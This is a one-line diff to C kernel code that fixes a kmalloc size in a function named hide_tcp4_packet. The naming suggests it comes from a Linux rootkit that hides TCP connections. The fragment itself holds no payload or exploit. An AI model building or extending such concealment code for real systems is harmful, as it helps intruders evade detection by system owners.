@@ -586,7 +586,7 @@ LIST_HEAD(hidden_tcp4_packets);
 
 int hide_tcp4_packet(const char *ip)
 {
-    struct hidden_packet *p = kmalloc(sizeof(struct file_entry), GFP_KERNEL);
+    struct hidden_packet *p = kmalloc(sizeof(struct hidden_packet), GFP_KERNEL);
     //size_t name_len;
 
     if (!p) {
